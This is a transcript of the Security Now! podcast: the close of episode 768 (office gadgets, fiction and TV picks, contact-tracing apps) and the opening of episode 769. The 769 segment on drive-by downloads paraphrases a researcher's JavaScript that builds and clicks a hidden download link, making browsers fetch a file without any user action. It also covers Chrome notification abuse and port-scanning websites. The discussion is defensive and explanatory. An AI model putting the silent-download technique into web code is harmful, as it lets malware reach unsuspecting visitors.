STEVE:  He's captured a screenshot from the podcast over my left shoulder.  You can see it right there in the background, to the left and below the three PDP-8 clones.  That thing is near and dear to my heart because I helped develop it.



LEO:  Oh, I didn't know that.



STEVE:  That's a Texas Instruments Speak & Spell.



LEO:  I had no idea.  I mean, I knew that it was a Speak & Spell.



STEVE:  And that was the first device that was generating synthetic speech.  It used a linear predictive coding codec in order to compress sounds.  Back then, 4Kbits was a big ROM, and actually 4Kbits is what that thing had.  And despite the fact that it was incredibly lean in memory, it was able to speak.  And I had a hand in making that technology happen.  So anyway, that's why that's there behind me.  And it's funny, too, because I just ran out of time.  It works, and I meant to have it so I could - my very favorite thing was it used to - one of the words that it asked you to spell, because it's a little tricky spelling-wise, was "relieve."  And of course so it would say "Spell relieve."  And then I would type R-O-L-A-I-D-S.



LEO:  You'd have to be of a certain age to recognize that reference, I think.



STEVE:  That's right.  And, finally, Stuart Donaldson.



LEO:  Wait a minute.  Now, as long as we're asking, because you're just going to get another question, so what's this thing right here?  It's next to the tape, the computer tape.



STEVE:  Ah, yes.  That is a field maintenance panel for a hard disk drive.  It's an exerciser.  Back in the day you needed to exercise hard drives, you know, when they were the size of washing machines.  And so a field service tech would unplug the computer and plug this thing in, and it pretended to be the computer.  So it would issue seek commands, and he was able to, like, put the thing through a controlled testing sequence.



LEO:  And I love the magnetic tape next to it from an IBM or some such mainframe.  And what is that, a DAT recorder above your head there?  Next to the OEDs?  To the right of the OEDs?  It looks like a VCR with a keypad on it.  Here, let me show you.



STEVE:  Oh, oh.  That's actually the front panel of an Interdata 1116 or 11 - it's another minicomputer...



LEO:  Your office is full of more junk than mine is.



STEVE:  ...from my history, yeah, yeah.



LEO:  And I recognize the real PDP over there.  And then I don't know what those - I'm just trying to save you more tweets, more things to respond to.  I love it.



STEVE:  All my gadgets, all my digits...



LEO:  There's a lot going on in this background there.



STEVE:  That's right.



LEO:  [Crosstalk] much attention to it.



STEVE:  I'm not sure that that's a good thing.  I've noticed that everybody is now doing podcasts and...



LEO:  Lots of backgrounds, too.



STEVE:  Yes, things from home.  Everyone is like, oh, look at those.  Look at that tree, it's - oh, look at that globe.  And it's like, okay, well, a little distracting.



LEO:  There's a whole Twitter account called @ratemyskyperoom, where there's rating people's backgrounds.



STEVE:  Oh, my lord.  Anyway, to finish up, Stuart Donaldson said:  "Hey, Steve.  You messed me up.  You turned me on to Peter F. Hamilton."



LEO:  Oh, good.



STEVE:  He says:  "I just finished up the audiobook 'Naked God,' the last book in the Nights Dawn Trilogy."  And weren't there five books in the trilogy?  I think there were more than just three.



LEO:  Oh, I don't know.  It was a long...



STEVE:  Or maybe I'm thinking of [crosstalk].



LEO:  It was a trilogy...



STEVE:  But definitely...



LEO:  There were a lot of books.



STEVE:  Like the fourth book in the Hitchhiker's Guide trilogy.  Like, okay, Douglas.  He says:  "Now I have six weeks of Security Now! to catch up on."  Oh, because he was listening to the audiobook, and Peter Hamilton never saw a book that he couldn't make longer.  So anyway, he says, "Stay safe."  And I wrote back, and I said, "My recommendation for your next read, Stuart, is 'Fallen Dragon.'  It's fabulous, and it's a rare Hamilton stand-alone novel.  Then you must read 'Pandora's Star' and 'Judas Unchained,'" which are two books.



LEO:  And I think we both agree that "Fallen Dragon" is the best starter Hamilton novel because it's a single novel.  It's incredible.  And all of the elements of his fiction are in that one book.  It's really good.



STEVE:  Yeah, yeah, really good.  So in Miscellany, two little bits, Leo.  I wanted to just mention "Bosch" on Prime.



LEO:  Yeah, oh, yeah, we've watched all of it.  We're going to watch the new season sooner or later.  Yeah, I like it.  It's good.



STEVE:  Okay.  Many people recommended it.  I finally started.  And I'm in the beginning of the fourth season and just absolutely loving it.  I think it's just a pitch-perfect hardened police detective series.  And I didn't know there was going to be another season, so I'm delighted.



LEO:  Yeah, I didn't either, yeah.



STEVE:  And speaking of another season, HBO is doing "Perry Mason."



LEO:  I saw the trailer for this, and I'm getting - that's exciting.  It's the origin story for Perry Mason.



STEVE:  Yes, yes.  Robert Downey, Jr. was going to play Perry, and I'm glad he had a movie-making conflict because I would not have liked him as Perry Mason.  I don't think I would have been able to buy him playing that part.  But Matthew Rhys, or Rhys...



LEO:  I think it's Rhys.  He was Henry VIII in "The Tudors."  And I loved - is that who it was?



STEVE:  He's a fabulous actor.



LEO:  He's really good.



STEVE:  He was also the husband in "The Americans."



LEO:  Yes, yes.



STEVE:  Yeah.  And...



LEO:  I'm thinking of Jonathan Rhys who's Henry VIII.



STEVE:  Oh, okay.  Yeah, Matthew Rhys was the husband opposite - I can't think of her name now.



LEO:  Oh, I love her, too, Keri...



STEVE:  Keri, yeah.



LEO:  Keri, yeah.  We all know her.



STEVE:  But also in "Perry Mason" - by the way, it's coming to HBO June 22nd - we get Tatiana Maslany is back.  And of course we talked about her on this podcast because she played, what, nine parts in - now I forgot that one. 



LEO:  Who was she?  Is that "Russian Doll"?  No.



STEVE:  No.  Remember - was it "Black Mirror"?  No, not "Black  Mirror."  That's a series.  Somebody will know.  Tatiana Maslany.  Anyway, we were just blown away that she was able to play so many different...



LEO:  Oh, "Orphan Black."



STEVE:  "Orphan Black."



LEO:  And she was all the clones of herself, yes.



STEVE:  Yes, yes, yes.  Thank you.



LEO:  She's the new Della.  No, she's Sister Alice.



STEVE:  So my take on contact tracing apps being DOA.



LEO:  Do you want me to do an ad before you do that?  We have one more.



STEVE:  Oh, I didn't know we had one more.  Yes, yes.



LEO:  Oh, you're replete with advertising today.  You have the full set, which is a very good thing.



STEVE:  That last one was the penultimate ad.



LEO:  Oh, dragging out the big words.  Let's talk about contact tracing apps, Steve Gibson.



STEVE:  So I believe that it's doomed.  As I mentioned at the top of the show, some academics who have modeled the system have determined that, to be effective, 80%, eight zero percent of all smartphone users would need to voluntarily opt into using the app.  And that's never going to happen, 80%.  As we saw, the instant the Apple/Google initiative was announced, both the nontechnical and, sadly, the technical press went berserk over the privacy implications.  Even highly technical individuals who should have known better spoke out with errant, frightening, and unfounded warnings before they understood how the system worked.



This podcast looked at the systems technology carefully and understood exactly what and why the Apple/Google team had designed it as they did.  And we found that the API itself absolutely protects the user's privacy.  But in practice, that doesn't matter at all.  That is, the fact that you really can trust it.  For one thing, as we've discussed since then, health officials really do have a need to collect real-time geographical location data as part of a workable system.  Adding the "where you were when it happened" would go a long way toward making up for a lack of pervasive use of an application.



For example, if only a few people in a large gathering were app-enabled, and it was determined from the app that that was the most likely infection event, then a call could be put out for other non-app-enabled people who were also present at that event to take the necessary precautions.  As we noted previously, the importance of knowing where, which Apple and Google scrupulously avoided using, has already occurred to the state of Utah, who has created a much more useful solution, which is also necessarily much more invasive, even though it was thoughtfully designed with things like immediate user deletion of all data and short-term self-expiring location data.



The simple truth is a short-term sacrifice of privacy is required for spreading events to be located and managed.  Even fully human-mediated contact tracing is by definition a short-term sacrifice of privacy.  Someone whom you've never met and don't know anything about needs to interview you to determine everything you're willing to share about where you've been, what you've done, and who you've been in contact with for the previous two weeks.



LEO:  And that better be pretty complete, yeah.



STEVE:  Yeah.



LEO:  Yeah, don't lie.



STEVE:  That's a massive imposition on one's privacy.



LEO:  Right.



STEVE:  But it's what's necessary.



LEO:  It's what works.



STEVE:  And I learned in doing the research about one of those new features in Google, Google says that people are constantly clearing their web browser histories, and that's just cyber.  Many people apparently really don't want anyone else to know where they've been and what they've been up to.  And at least when interviewed by a human contact tracer, someone can choose to elide anything they're embarrassed to share.  But you can't do that with an app.  So how many people are going to voluntarily install what amounts to spyware?  As we well know, many people also have an inherent mistrust of the government and its motives.



We've already seen people worrying that this might just be the start of more pervasive monitoring, I mean, even Andy on MacBreak Weekly was worrying about that, the start of more pervasive monitoring, with statements like - and I'm not quoting Andy, I had this already written - "If they are allowed to do this, they'll always want more, and why would they ever want to stop?" and so forth.  So no.  It was a noble idea.  I loved the cleverness of the technology.  It was fun to dissect it and share its operation with our users.  But it's clear that as a voluntary initiative it's never going to get off the ground.



So I just, you know, to me, the idea of states using a more invasive technology, as I noted, really does make up for the fact, it goes a long way toward making up for the fact that just not that many people are going to take advantage of it.  But for those who do, who are involved in events where an infection is present, if you know where and when, then you're able to move that from cyber into physical.  And after all, that's what human contact tracing is, is physical contact monitoring.  So I just think there's just no chance for software-based apps, if they are voluntarily installed.



LEO:  And Bruce Schneier brought up the really excellent point about - and I don't know if you read Schneier's post a few days ago.



STEVE:  I did not.



LEO:  He agrees with you.  He says it's just - it's not going to - it's just they don't work because of the potential for false negatives or false positives.  People aren't going to trust it.  And it's just not going to work.  We need human contact tracing.  Now, I think these apps could be a useful adjunct to help with - because one thing, I don't remember where I've been, everywhere I've been in the last 14 days.



STEVE:  Yeah, good point.



LEO:  Having a map of that, that maybe only I see or whatever, that would be useful.



STEVE:  It would jog your memory.



LEO:  Yeah.  There's a lot of things that could be useful.  But as constituted, Apple and Google have done such a good job of protecting our privacy, they've made their apps pretty much useless to human contact tracers.  And we know that human contact tracing is - you need extensive testing and tracing, period.  So, yeah.  Unfortunately...



STEVE:  And I think maybe it suffers a little bit from - I think the Apple/Google approach maybe suffers a little bit from just being developed by techies without contact from actual health officials, who would have said, wait.



LEO:  We need that.



STEVE:  We have to know where this happens.



LEO:  It's not useful.  No, that's what Schneier said.  He said tech will always respond with what tech knows how to do because they want to help.  But that's not necessarily what needs to be done.  It's just what they can do.  And I think that's, I mean, I agree, they did it very well.  But it's just, from a health perspective, health official perspective, it's not sufficient.



STEVE:  I would love, as I mentioned when we talked about Utah, I would love for the state of California to do an invasive health monitoring app.  And I would load it.



LEO:  Well, they're not using the Google API.  They're going to do their own thing.  The problem in my opinion is, I agree, we need testing, and we need human tracing.  The countries that that's been done in, it has worked.  It's worked very well.  It's eliminated COVID-19 cases.



STEVE:  Just killed it.



LEO:  Just killed it.  But I don't think it's ever going to happen in the U.S.  We just - we're not going to sit still for that.  We won't even wear masks.



STEVE:  I agree.  I agree.



LEO:  This is a country founded on individual liberty, and it's inconsistent with what is necessary to stop the virus.  That's why there's all the emphasis on, well, let's get a vaccine, because they know there's nothing else that's going to work.



STEVE:  Right.



LEO:  And what that means is many, many, many more people will die.  We'll have many more, you know, go back inside.  It's not over.  And then coming out, and going back.  And it's going to be a bit of a seesaw for a little while, yeah.



STEVE:  I think that's right.



LEO:  Well, there you have it.  Do recommend both the Schneier article on it, and then he refers to a Brookings Institute article which came up with the same conclusion that you have, as well, independently.  So, yeah, I think it's...



STEVE:  And you had some information that you mentioned on MacBreak Weekly about what states are doing.  Are states going their own way? 



LEO:  Yeah.  So only four states have so far said that they are going to make an app supporting the API, the Apple/Google API.  Alabama, North Dakota, I can't remember the two others.  There's a list...



STEVE:  Oh, my god, those two need invasive contact tracing more than anybody else.  Alabama's in horrible shape right now.



LEO:  That's right, yeah, exactly.  But California, in fact it was an article - Mikah Sargent referred to it in our show earlier today, iOS Today.  I wonder if I can find it.  But it was an article by, I think it was - oh, it was Zak Hall, I think, as I remember, who actually went to the trouble of calling every state, every state health department, and trying to figure out which states were going to do what.  And he has an actual list, state by state list, and quotes from each state health director about the plans.



And, yeah, only four states have any plans to, at this point, anyway.  And Latvia.  Latvia's going to use the Apple/Google API.  So it's not exactly widespread acceptance.  It's a tough one we're in, Steve.  But I'm glad we're quarantining together, you and me, you with your Speak & Spell.  Didn't that feature in an early episode of "Halt and Catch Fire"?  Didn't he - that's how he got into making these computers?  They took apart a Speak & Spell?  Except they didn't call it a Speak & Spell because...



STEVE:  You know, one place I do remember it, I think that ET used it as part of his...



LEO:  ET did, as well, yeah.



STEVE:  Yeah.



LEO:  Yeah, Richard Dreyfuss, yeah.  Wow.  See, we're standing in the presence of giants, ladies and gentlemen.  Steve Gibson.



STEVE:  Well, we're sitting, at least.



LEO:  We're sitting.  I'm sitting on the ball, but we're sitting in the presence of giants.  Steve Gibson's at GRC.com.  That's where you'll find, not only his great SpinRite, the world's best hard drive recovery and maintenance utility, the only thing he charges for, lots of free stuff, lots of informational stuff, ShieldsUP! and so forth.  Plus of course you'll find this show.  He's the only person in the world who has 16Kb versions of this show for the bandwidth impaired.  He also is the only person with full transcripts, written by Elaine Farris, so they're very good, very accurate.  So if you like to read along while you're listening, or maybe you like to just read instead of listen, that's all there at GRC.com.  He also has 64Kb audio.



We have the audio, but also the video at TWiT.tv/sn.  We do the show on Wednesdays, I'm sorry, Tuesdays, 1:30 Pacific, 4:30 Eastern.  That's 20:30 UTC.  If you want to watch, tune in Tuesday.  You can just go to TWiT.tv/live.  There's multiple streams there, audio and video.  After the fact it's easy enough.  You just go to our website or Steve's website and download a copy.  Or, and this in my opinion is the best way to do it, get a podcast application, there's plenty of them, and subscribe.  That way you'll get it automatically.  You probably want every episode.  What is this, what did you say, 768?



STEVE:  768.



LEO:  Wow.  I think you should really have the complete set.  Then you can follow the ebb and flow, 15 years or something of security.  Steve, thank you, have a great week, and we'll see you next time on Security Now!.



STEVE:  In June.



LEO:  Wow.  How did that happen?  Halfway through.



STEVE:  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#769

DATE:		June 2, 2020

TITLE:		Zoom's E2EE Design

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-769.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at which browsers still permit drive-by website downloads, Google's plan to blacklist notification-abusing websites, a deeper dive into local PC port scanning being performed by websites, Facebook's move to tighten up on high-impact posters, the new lawsuit against Clearview AI, some very interesting strings found embedded in Google's latest messaging app, the very worrisome return of a much more potent StrandHogg for Android, the refusal of SHA-1 to die, a more powerful new USB fuzzer, and an update in some nearly finished SpinRite work.  Then we take a look at Zoom's newly detailed plans to become the world's most secure teleconferencing platform.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Coming up on this episode, the ACLU sues face recognition company Clearview AI.  We'll talk about end-to-end encryption, both in Google's new RCS messaging system and in Zoom.  How do they do it?  Steve's impressed.  Stay tuned for the details.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 769, recorded Tuesday, June 2nd, 2020:  Zoom's E2E Encrypted Design.



It's time for Security Now!, the show where we cover your security online, your privacy, how things work, and a few little tidbits thrown in here or three with this guy right here, Steve Gibson of the Gibson Research Corporation.



STEVE GIBSON:  How things work and what happens when they break.



LEO:  When they don't work.



STEVE:  And stop working, yes.



LEO:  Salute to you, Steve.  Hello.



STEVE:  Leo, great to be with you once again, Episode 769 for this first podcast of June.  God, where is the year going?  2020, what a bizarre year we're in.  Friday before last a large team of folks working on behalf of, in some cases with and some cases helping Zoom, published their end-to-end encryption design document, 25 pages of aspiration and clearly some perspiration.  Lots of equations that we're not going to try to do on a mostly audio podcast.  But the concepts are there, and they're readily understandable.  So I thought it would be fun to take a look at how Zoom is - what they've already done and at what their plan looks like, the roadmap that they've laid out for how they're going to get to what will arguably be the most secure teleconferencing solution on Earth by the time they're done.



So today's topic is Zoom's E2EE, which of course is the acronym we're now seeing more and more, end-to-end encryption design.  But lots of fun stuff happened this week.  Well, fun if you're in the podcasting business.  We're going to look at which browsers still permit drive-by website downloads and define what that is.  Google's plan to blacklist, I mean, bad list notification-abusing websites.  We're going to take a bit deeper dive, thanks to some research that Lawrence Abrams did over at BleepingComputer into all the other sites that are apparently doing local PC port scanning.  We talked about eBay last week.  Turns out, yes, there's 300 and some odd others.  Many of them are substantial.



There's also a new lawsuit being brought against Clearview AI, which I think is nothing but good because we need the brakes to be put on this, and some serious thought to be given to the consequences of this pervasive facial hoovering of all images everywhere and then AI to identify them.  There's some new facts that come out in this lawsuit that I want to share with our listeners.  Some very interesting strings have been found embedded deep in Google's latest messaging app, indicating some future intent, which is intriguing.  We've got a very worrisome return of a much more potent version of StrandHogg for Android.  We also had the refusal of SHA-1 to die, despite many attempts to just end it.  It's just really putting up a fight.  A more powerful new USB fuzzer and what it has found.



I will update our listeners on some very nearly finished SpinRite work, sort of a necessary subproject that I've been on for about three weeks, pretty much wrapped up yesterday with a little bit more fine-tuning to do.  And then, as promised, we'll take a look at Zoom's new detailed plans to become the world's most secure teleconferencing platform.  And this Picture of the Week is not apropos of anything security.  But I encountered it when I was looking to see whether last week's wacky Windows 10 airplane was available as wallpaper.  And this was somewhere nearby.  And I thought, oh, this is - at least it's technology.  So it's just too fun.  So I think another great podcast for our listeners.



LEO:  It's sort of technology.  Sort of technology.



STEVE:  So Leo, remember that picture we had a couple years ago, there's a plastic pail half filled with dirt, and there was a rod stuck into it and a big green ground wire wrapped around the rod.



LEO:  Yeah, yeah.



STEVE:  And some person figured, oh, well, I was told I had to ground this.



LEO:  There you go.  Yeah, it's in the ground.



STEVE:  So I stuck it into a pail of dirt.  And it's in the ground; right?  I mean, it's dirt.  So this picture sort of reminds me of that.  In a perfect world, you'd have this pipe going along that needs to apparently go into a pipe that goes into the ground, and it would just do a right angle and go from horizontal to vertical into the ground.  But in this world, which is far from perfect, there's a big rock in the way.



LEO:  Apparently too heavy for the plumber to move.



STEVE:  And I do not know, I would love to know the true back story here, how this happened.  But maybe the rock is not movable.  It's cemented in place.  Or as you said, it's just too heavy.  I mean, it's a big rock.  But anyway, whoever had the chore of connecting the horizontally running pipe to the pipe coming out of the ground figured, well, there's a rock in the way.  So very much reminiscent of that Three Stooges episode where Moe or Curly or whoever it was was in the bathtub, trying to plumb himself out, and ended up in a pipe cage, this thing does a right turn to go up, then another 90-degree more leisurely bend to go horizontal across the top of the rock, then sort of a 45-degree angle down to get...



LEO:  I like that.  I like that choice.



STEVE:  ...to the other side of the rock, apparently because the...



LEO:  It's really contoured to follow the rock's surface.



STEVE:  It really does.  And then another 45 to get vertical in order to go into the pipe in the ground.  So again, you know, I don't know, like, what the pipe in the ground is about, where that goes or where it's coming from.  It must be the source of water.



LEO:  I just hope this isn't a drain.



STEVE:  And so anyway, as I said, last week I was looking for the more sources for the wacky Windows 10 "We finally fixed all the problems" that had the landing gear coming out of the roof of the cockpit and the wings on sideways.  And I thought, okay, this is just too fun for the podcast.



Okay.  But so what's not fun is the surprising state in 2020 of drive-by malvertising downloads.  Yesterday, Monday the 1st, a guy named Eliya Stein, who's with the advertising security firm Confiant, C-O-N-F-I-A-N-T, blogged about some research he'd just finished regarding the susceptibility of our current web browsers to so-called drive-by downloading.  It's interesting that downloading can be automated, which is something you may not have thought about before, but I encounter this at some funky sites.



SourceForge is one that comes to mind.  When you want to download from SourceForge something, you say, you know, I want to go to the download page.  And you get, rather than like a dialog that pops up that says, hi, want to download this from here?  Instead, you kind of get this little green "Be patient" spinner that says your download will begin shortly.  And then without you doing anything, you'll notice if you're using Chrome, for example, that down in that lower left area of the browser window, where downloads appear, it'll suddenly open up all by itself and start downloading.  And you didn't do anything.  I mean, you didn't press any buttons.  You didn't get a confirmation dialog.  It just did it for you.



So that's good if you're at a site where you deliberately went to a page and you want to download something.  Not so good, you can imagine, if you're on a site who's hosting a malicious ad in an iframe, and this can all happen within an iframe.  So in a drive-by download, iframed script content which is coming from a third-party domain, it's in an iframe to offer some containment, and the iframe points to an ad server that then provides the content on a rotating ad basis.  So that's the way any contemporary ad server works.  In this case, it's running in an iframe.



But thanks to the fact that JavaScript is able to directly modify the DOM, that's the web page's Document Object Model, that is, I'm sure that someone somewhere thought, oh, wouldn't it be cool if script could write its own web pages?  It's like, yes, what could possibly go wrong?  So in this case malicious JavaScript is able to programmatically define a new download link, an "a" tag, an <a href> in HTML parlance, then click it in order to initiate its own, from the user's standpoint, zero-click download.



Eliya's attention was drawn to this practice when BoingBoing was delivering for some period of time malicious downloads to their visitors using this technology.  And after many complaints, BoingBoing disclosed that their site had been hacked.  So in this case the malicious code was placed onto their servers so that it was running in the same origin as the page and had unfettered access to the user's page, very much like if SourceForge was hacked and I went to that download page.  I don't know.  I have no control over what's happening.  It just stuck something in my Download directory.



So Eliya wrote that:  "Over the following weeks, we detected this attack on a multitude of sites.  Usually this manifests through a CMS [Content Management System] compromise that introduces this malicious payload.  To date we've identified the presence of the IOCs [Indications of Compromise] associated with this attacker on 15 sites within our telemetry.  But a cursory look at VirusTotal shows that activity around this particular payload has been ongoing for at least a year, and that these command-and-control domains are leveraged by multiple variants of the malware."



So having uncovered the mechanism that this attacker uses to drop the malware, Eliya decided to conduct an audit of recent popular browser versions to see how they handle downloads that are not initiated by direct user interaction.  The inspiration for doing this analysis was the surprising discovery that most browsers will honor downloads triggered from cross-origin iframes, which is, like, shocking.  Like why would you ever want that to happen, especially with no user interaction?  And what's more, these zero-click downloads are often still possible within sandboxed cross-origin iframes.  Remember that sandboxing is an extra parameter that can be added to an iframe's attribute list to, like, further strengthen its controls.



In one example, this has only finally been addressed in Chrome for this latest Chrome 83 that we all got and talked about last week.  And I have a link in the show notes to chromestatus.com/feature and then a long serial number-ish thing.  It reads - so this is for Chrome.  This is in the Chrome status log, download in sandboxed iframe (removed) under the security subhead.  And it says:  "Sandboxed iframe can initiate or instantiate downloads."  And it's like, what?  Really?



LEO:  Doesn't seem like a good idea.



STEVE:  Like before last it could?  Unbelievable.  So they said:  "Chrome is planning on removing this capability."  Yes, please.  And they said, i.e., "Chrome is going to block all downloads initiated from or instantiated in a sandboxed iframe by default."  What a concept.  "The embedder may add 'allow-downloads' to the sandbox attributes list to opt in."  Please don't.  "This allows content providers to restrict malicious or abusive downloads."  Well, wouldn't that be nice.  Then they said:  "Removal is expected in Chrome 83.  This allows content providers to restrict malicious or abusive downloads."  Yeah, good.



So anyway, finishing this up under Comments, it says:  "Downloads can bring security vulnerabilities to a system."  Who's writing this?  Anyway:  "Even though additional security checks are done in Chrome and the operating system, we feel blocking downloads in sandboxed" - hello, sandboxed - "iframes also fits the general thought behind the sandbox."  Oh, really.  Yeah, okay.



Anyway, so Eliya wrote:  "For our study, we will test the mechanism inside and outside of cross-origin iframes.  The payload we use looks like this."  And I've got the short little bit of JavaScript code, just because it was so cute and short and understandable.  So basically there's a document.createElement, and then in quotes "a."  So it's going to create an "a" element, an "a" tag, you know, an anchor.  And that's being assigned to the variable link.  Then link.setAttribute, href, payload.apk.  So that in this nascent "a" tag, the href value is set to, or the href tag, the href name is set to the value payload.apk.  So that's what will be downloaded when the link is clicked.



Then the attribute "download" is set to download, to indicate what kind of link this is.  Then the display style is set to "none" because of course, right, you don't want the person, the user, the hapless unwitting victim who's gone to this web page to see any of this going on.  So then to the document body the link is appended.  And then, in the final line of this little JavaScript code, the link is clicked.  Which of course initiates the download of payload.apk.  What could possibly go wrong? 



This simple bit of code does what I described before:  It creates a new link where there was none, sets its download href, makes it invisible, appends it to the existing web page, and then programmatically clicks the link to initiate a download.



So what did Eliya learn about the status of today's web browsers regarding their hosting of these ad hoc download links in iframes?  Chrome 83 does indeed block downloads initiated from sandboxed, thank goodness, cross-origin iframes.  But apparently Chrome 82 didn't.  Well, fortunately we all have 83 now.  But even it, even Chrome 83, is still willing to drop a file if the iframe's sandbox parameter is not set.



So let me say that again.  If on all your pages, anywhere you're using an iframe, if you haven't gone back and added "sandbox" to the iframe, it's not sandboxed.  And malicious ads can load some script that will download a file.  Unbelievable.  But true.  However, other desktop browsers will trigger a prompt for the download.  This must have been some ease-of-use thing that Google thought Chrome should have, where just kind of like, oh, look, it's downloading something.  I hope that's good.  Oh, my goodness.



Anyway, other desktop browsers will trigger a prompt for the download, including the security-conscious Brave and Firefox.  Both of them give you like an OS dialog.  And under many circumstances, browsers will drop the download without any prompt at all.  For example, the same payload in a non-sandboxed cross-origin iframe in Chrome 83 will drop the download without a prompt and without any indication that the initiator is not the origin that's displayed in a URL bar.  In other words, it's not same-origin, it's some other origin.  It's Ads R Us and TrustUs.com.



And at least here Firefox's prompting for action is consistent, that is, Firefox always prompts.  You never get an unattended, unprompted download.  And apparently Safari attempts to honor and initiate the download, but then kind of gets stuck in some way that he wasn't clear about along the way.  And in the mobile world, behavior is also inconsistent.  Android browsers are, fortunately, quick to warn when the download is a file with an APK extension.  So they're all tuned-up on that.  But any other type of file often doesn't receive a prompt.  And as we know, files could be renamed after they have arrived.  So not clear how much protection that adds.



At this point in his blog posting Eliya places a large bold callout reading:  "It's 2020, and we can still force downloads that are not user initiated, without any prompt, from cross-origin iframes, in half the major browsers out there.  Why?"  Incredible.



He concludes by observing:  "Within the context of hacked sites as perpetrated by our site-compromising attacker, ad tech has no role to play."  Meaning that they are, because they're same-origins events because the site delivering the page is the one that was compromised, as opposed to an ad server running in a cross-origin iframe.  He says:  "No amount of ad or iframe sandboxing can help to mitigate the last mile of this particular attack because the download is dropped from a seemingly trusted source.  So perhaps we should think about always prompting users before a download takes place, along with an informational modal dialog about the origin of the download."



So there he's saying, look, because you can have - you can't rely on malicious content always coming cross-origin.  Even if the browsers were all handling that correctly, which they're not, it's certainly the case that sites are getting compromised.  And by using this download automation for apparently ease of use and user friendliness, maybe all downloads should be user prompted.  And I completely agree.  There's a point where security really ought to trump automation convenience.  Call me old-fashioned.  I'm sure I am.  But I would like to be in the loop anytime my browser is downloading a file into my machine.  I just can't imagine that you can secure things otherwise.  So thank you, Eliya, for that research and for a bit of a heads-up on this.



Also in Google news, they're planning to blacklist - and as I wrote that I thought, whoops, I mean bad list...



LEO:  Thank you.  This would be a bad day to get that wrong.



STEVE:  Yes, notification abusing sites.  They intend, Google intends to shield Chrome users from two types of abusive alerts.  And remember we were just talking about alerts a couple weeks ago when I saw one that just made my eyes cross.  And Leo, you said, wait a minute, you mean you have to acknowledge this notification to allow notifications in order for the site to  allow you in.  It's like, yeah, that actually happens.



LEO:  Yeah, that pisses me off.  That's a site I'll never visit, yeah.



STEVE:  And this is what Google's talking about.  They call them "permission request issues" which attempt to mislead, trick, or force users into allowing notifications.  And of course this is the behavior I talked about a couple weeks ago.  The second form of abuse are the content of subsequent notifications which are then used for phishing, delivering malware, or faking chat messages, warnings, or system dialogs.  So with the forthcoming mid-July release of the next Chrome, Chrome 84, the browser will also inform users that these abusive websites may be trying to trick them by phishing for private information or promoting malware.



A Google spokesperson explained that:  "Abusive notification prompts are one of the top user complaints we now receive about Chrome."  And I have to say I'm just not clear on the whole value of the notification.  Remember that, if you allow a site to enable notifications, then even when you're not at that site, even when your browser is not forefront, the notification system now links into the OS notifications, and you see notifications from that site that look undistinguishable from OS-grade notifications.  I mean, who thought that was a good idea?  Anyway...



LEO:  People who are pushing browsers as applications.



STEVE:  Yeah, exactly.  Although Chrome 84's abusive notification protection is designed to only trigger for new notification permission requests from abusive websites, Google is also planning to expand these protections to users who've already provided abusive sites with permission to deliver notifications.  Yay.  Because we've talked about what happens if you've already given permission.  We talked about how you can go back and audit your notification list.  It's not hard to do.  But lots of less-focused users don't know how to do that.  Google said only a small fraction of websites will be affected by this change.  But we expect the impact on notification volume will be significant for some users.



So what's happening is there's only a small number of abusive sites, but they're being very abusive.  So what they're going to do is they're going to get proactive.  They plan to give these sites that have been identified as abusive 30 days' written notice by email prior to tagging them as abusive.  And that'll allow websites' owners to check whether they've been tagged using the Google search console in order to check the status of their site.  They'll have 30 days to fix their content and ask to be resurveyed in order to be taken off of the pending abuse list.  But starting in August they will be actively blocking sites, these sites that have been tagged as abusive.  So essentially they're going to proactively step in to say, you know, this is not how we intended site notification to work.  Cease and desist or you're in trouble.



LEO:  Yes?



STEVE:  I just lost my picture.



LEO:  You paused?



STEVE:  Ah.  Interesting.  Anyway...



LEO:  You don't need pictures.  You never wanted video in the first place.



STEVE:  It just went weird.  This is Skype these days.  Ah, thank you.  Anyway, so starting in August, in addition to that, Chrome will also be blocking resource-consuming ads which tie up too much of the system's resources without the user's knowledge.  So bravo to Google.  These all seem like clean, sensible, and responsible actions from the industry's number one browser source.



So, as I mentioned at the top, the question of who else might be doing this eBay-like ThreatMetrix port scanning that we talked about last week.  Lawrence Abrams over at BleepingComputer was wondering, as he frequently does, and decided to find out.  To determine which other sites might be using the same scanning script, BleepingComputer reached out to a company called DomainTools that's a cybersecurity company specializing in web domain and DNS threat intelligence.  So they're the right kind of profile.  It turned out that when websites load ThreatMetrix's antifraud script, they load the script from a customer-named online-metrix.net hostname.



Okay.  So, for example, eBay loads the ThreatMetrix script from a domain src.ebay-us.com.  Meaning that the ThreatMetrix script appears to be coming from eBay.  But a query to that src.ebay-us.com domain returns a CNAME record.  That's CNAME for canonical, and it's also known as an alias.  In other words, it's the src.ebay-us.com domain is an alias for another domain.  In this case, that redirects DNS lookup to h-ebay.online-metrix.net.  That is, over to the actual ThreatMetrix domain.



So as a consequence of that, that's all visible.  So DomainTools was able to provide BleepingComputer with a list of 387 unique online-metrix.net references that share a similar naming scheme.  And Leo, I've got a link down toward the end of this page to a Google spreadsheet list of these names.  It's rather daunting when you actually see it.  So then, using this list, Bleeping Computer visited the sites for many of the larger prominent companies to verify whether they were in fact performing a local client-side, that is, browser-hosted port scan, into their visitor's computer when someone just visited.



BleepingComputer wrote that they did indeed detect port scanning when visiting Citibank, TD Bank, Ameriprise, Chick-fil-A, LendUp, Beachbody, Equifax IQ Connect, TIAA-CREF, Sky, GumTree, and WePay.  Lawrence noted that the specific scanning behavior tended to vary from site to site.  Citibank, Ameriprise, TIAA-CREF immediately port scanned their visitors' computers when visiting the main page of the site.  TD Bank, Chick-fil-A, LendUp, Equifax IQ Connect, Sky, GumTree, and WePay only port scanned when visitors attempted to log in.  And Beachbody.com only port scanned when checking out.



